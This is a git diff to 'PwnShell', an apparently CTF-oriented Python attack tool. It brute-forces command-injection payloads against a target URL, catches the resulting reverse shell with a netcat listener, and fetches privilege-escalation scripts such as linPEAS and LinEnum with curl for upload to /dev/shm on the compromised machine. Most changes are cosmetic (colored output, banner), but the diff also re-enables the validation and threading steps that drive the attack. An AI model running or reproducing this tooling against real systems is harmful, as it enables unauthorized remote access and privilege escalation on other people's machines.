@@ -17,6 +17,7 @@ from payloads import PayLoads
 import time
 import socket
 import burpee
+from colors import Colors , ColorsSet
 
 
 class PwnShell:
@@ -47,18 +48,19 @@ class PwnShell:
         ######################################################################
 
     def info(self):
-    	info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL': self.domain, '[*]Method':self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
+    	info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL ': self.domain, '[*]Method': self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
     	for key, value in info.items():
     		if value:
-    			print(f'{key} : {value}')
+    			print(colors.get_colored_text(f"{key} : ", ColorsSet.ORANGE),end='')
+    			print(colors.get_colored_text(f"{value}", ColorsSet.SILVER))
     	print("\n")
     ####################################################################################
     ###################################  LINUX #########################################
 
     def shell_linux(self):  # Default option
         self.info()
-        #self.is_valid()
-        #self.thread()  # leave it the last one
+        self.is_valid()
+        self.thread()  # leave it the last one
 
     #########################################################################################
     ###################################  WINDOWS #########################################
@@ -87,12 +89,12 @@ class PwnShell:
 
     def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
         nc = nclib.Netcat(listen=('', self.port))
-        print("\n\n[!]STAGE #2 --> [INFO] <--")
+        print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
         print(f"[*]CONNECTED TO --> ['{self.ip}',{self.port}]")
         print("[+]Vulnerable URL:",self.url)
-        print(f"[+]Number Of Payloads Tested : [{self.iteration}]") 
-        print("\n[!]STAGE #3 --> [STABILIZING] <--")
-        print('[*]Cloning PrivESC Scripts From Their Repositories... ')
+        print(f"[+]Number Of Payloads Tested : [{self.iteration}]")
+        print(colors.get_colored_text("\n[!]STAGE #3 --> [STABILIZING]", ColorsSet.ORANGE))
+        print('[*]Cloning PrivESC Scripts From Their Repositories...')
         time.sleep(1)
         print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
         os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
@@ -144,7 +146,7 @@ class PwnShell:
     ############################################################################################
     ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
-    	print("[!]STAGE #1 --> [BRUTEFORCING] <--")
+    	print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
     	listt=[]
     	self.iteration=0
     	payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
@@ -220,22 +222,23 @@ if __name__ == '__main__':
     try:
         banner = ''' 
 
-$$$$$$$\                           $$$$$$\  $$\                 $$\ $$\ 
-$$  __$$\                         $$  __$$\ $$ |                $$ |$$ |
-$$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ /  \__|$$$$$$$\   $$$$$$\  $$ |$$ |
-$$$$$$$  |$$ | $$ | $$ |$$  __$$\ \$$$$$$\  $$  __$$\ $$  __$$\ $$ |$$ |
-$$  ____/ $$ | $$ | $$ |$$ |  $$ | \____$$\ $$ |  $$ |$$$$$$$$ |$$ |$$ |
-$$ |      $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
-$$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
-\__|       \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
-########################################################################
-------------------------------------                                                                                
-| Authors: [AbuQasem] & [AlBalouli] |                                              
-------------------------------------                               
-\n   
+ $$$$$$$\                           $$$$$$\  $$\                 $$\ $$\ 
+ $$  __$$\                         $$  __$$\ $$ |                $$ |$$ |
+ $$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ /  \__|$$$$$$$\   $$$$$$\  $$ |$$ |
+ $$$$$$$  |$$ | $$ | $$ |$$  __$$\ \$$$$$$\  $$  __$$\ $$  __$$\ $$ |$$ |
+ $$  ____/ $$ | $$ | $$ |$$ |  $$ | \____$$\ $$ |  $$ |$$$$$$$$ |$$ |$$ |
+ $$ |      $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
+ $$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
+ \__|       \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
+ ########################################################################
+ ------------------------------------                                                                                
+ | Authors: [AbuQasem] & [AlBalouli] |                                              
+ ------------------------------------                               
+\n '''
 
-                                      '''
-        print(banner)
+        
+        colors=Colors(ColorsSet.WHITE)
+        print(colors.get_colored_text(banner, ColorsSet.GREEN))
         parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
         try:
             ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
@@ -245,13 +248,16 @@ $$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
             parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
         parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
         parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
-        parser.add_argument("-u", "--url", help='Target url [http/s://localhost:8888/h.php?meow=PWNME]')
+        parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
         parser.add_argument("-f", "--file", help='Request file')
         parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
         parser.add_argument("-d", "--data", help='Post data')
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
         parser.add_argument("-m", "--method", help='Request Method',default='POST')
+        args=parser.parse_args()
+        ########################################################################
+        ########################## Defining variables ##########################
         pwnshell = PwnShell(args)
         pwnshell.send_payload()
     except KeyboardInterrupt:
